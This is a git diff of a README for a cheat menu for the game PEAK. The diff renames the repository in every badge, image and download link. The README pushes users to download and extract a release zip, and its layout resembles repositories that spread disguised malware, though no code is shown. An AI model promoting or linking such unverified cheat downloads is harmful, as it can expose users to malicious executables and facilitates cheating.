@@ -1,9 +1,9 @@
 # PEAK Mod Menu / Cheat Hack 1.2
 
-[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/fuseloadercatalog/PEAK-cheatmenu/releases/download/1.2/PEAK.Mod.Build.v1.2.zip)
-[![GitHub release](https://img.shields.io/badge/Release-1.2-blue?style=for-the-badge)](https://github.com/fuseloadercatalog/PEAK-cheatmenu/releases/download/1.2/PEAK.Mod.Build.v1.2.zip)
+[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/fuseloadercatalog/PEAK-hacks-menu/releases/download/1.2/PEAK.Mod.Build.v1.2.zip)
+[![GitHub release](https://img.shields.io/badge/Release-1.2-blue?style=for-the-badge)](https://github.com/fuseloadercatalog/PEAK-hacks-menu/releases/download/1.2/PEAK.Mod.Build.v1.2.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](https://opensource.org/licenses/MIT)
-[![Stars](https://img.shields.io/github/stars/fuseloadercatalog/PEAK-cheatmenu?style=for-the-badge&logo=github)](https://github.com/fuseloadercatalog/PEAK-cheatmenu/stargazers)
+[![Stars](https://img.shields.io/github/stars/fuseloadercatalog/PEAK-hacks-menu?style=for-the-badge&logo=github)](https://github.com/fuseloadercatalog/PEAK-hacks-menu/stargazers)
 
 A feature-rich cheat for PEAK with a clean UI!
 
@@ -13,7 +13,7 @@ Check out the Features list
 
 ## Features
 
-![1](https://github.com/fuseloadercatalog/peak-cheatmenu/blob/main/assets/image.png)
+![1](https://github.com/fuseloadercatalog/PEAK-hacks-menu/blob/main/assets/image.png)
 
 ### Player Mods
 
@@ -72,7 +72,7 @@ Check out the Features list
 
 ## How to Install
 
-1. Download the [latest release build](https://github.com/fuseloadercatalog/PEAK-cheatmenu/releases/download/1.2/PEAK.Mod.Build.v1.2.zip) from repo's Releases page.
+1. Download the [latest release build](https://github.com/fuseloadercatalog/PEAK-hacks-menu/releases/download/1.2/PEAK.Mod.Build.v1.2.zip) from repo's Releases page.
 
 2. Extract the contents to any folder (e.g., `C:\PEAK_Cheat`).
 
@@ -103,4 +103,4 @@ Just delete the extracted folder. No registry changes or leftover files.
 ---
 
 
-[Download Latest Version](https://github.com/fuseloadercatalog/PEAK-cheatmenu/releases/download/1.2/PEAK.Mod.Build.v1.2.zip)
+[Download Latest Version](https://github.com/fuseloadercatalog/PEAK-hacks-menu/releases/download/1.2/PEAK.Mod.Build.v1.2.zip)
